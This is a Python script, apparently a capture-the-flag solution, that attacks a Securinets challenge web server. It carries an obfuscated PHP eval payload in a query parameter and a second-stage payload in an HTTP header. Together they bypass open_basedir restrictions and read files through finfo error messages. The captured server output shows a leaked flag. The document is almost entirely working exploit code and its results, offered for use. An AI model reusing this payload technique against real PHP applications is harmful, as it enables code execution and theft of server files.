#!/usr/bin/env python

import requests

headers = {
    'Connection': 'keep-alive',
    'Cache-Control': 'max-age=0',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.106 Safari/537.36',
    'a':"ini_set('display_errors', 1);ini_set('display_startup_errors', 1);error_reporting(E_ALL);chdir('images');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/');new finfo(0,'/');",
    'Accept-Language': 'fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7',
}

params = (
    (' cmd', 'eval(((((((999**999).(1)){2})|(((-2).(1)){0})&(((1).(0)){0}))).(e).(((((999**999).(1)){0})&((((999**999).(1)){2})))|(4).(4){0}).(e).(((999**999).(1)){1}).(v))((((((999**999).(1)){0})&(((999**999).(1)){1})).(((((999**999).(1)){0})&((((999**999).(1)){2})))|(4).(4){0}).(((((999**999).(1)){0})&((((999**999).(1)){2})))|(4).(4){0}).(((((2).(0)){0})|(((999**999).(1)){2}))&((((0/0).(0)){1})|(((1).(0)){0})))._.(a))))'),
)

r = requests.get('http://web2.q21.ctfsecurinets.com:8081/', headers=headers, params=params)
print(r.text)

"""
<br />
<b>Notice</b>:  finfo::finfo(): Warning: offset `&lt;?php' invalid in <b>/var/www/html/index.php(26) : eval()'d code(1) : eval()'d code</b> on line <b>1</b><br />
<br />
<b>Notice</b>:  finfo::finfo(): Warning: offset `$flag='securinets{87E4C6A81CD3104AE4ADBF0758268134D0B}';' invalid in <b>/var/www/html/index.php(26) : eval()'d code(1) : eval()'d code</b> on line <b>1</b><br />
<br />
<b>Fatal error</b>:  Uncaught Exception: finfo::finfo(): Failed to load magic database at '/'. in /var/www/html/index.php(26) : eval()'d code(1) : eval()'d code:1
Stack trace:
#0 /var/www/html/index.php(26) : eval()'d code(1) : eval()'d code(1): finfo-&gt;finfo(0, '/')
#1 /var/www/html/index.php(26) : eval()'d code(1): eval()
#2 /var/www/html/index.php(26): eval()
#3 {main}
  thrown in <b>/var/www/html/index.php(26) : eval()'d code(1) : eval()'d code</b> on line <b>1</b><br />
  """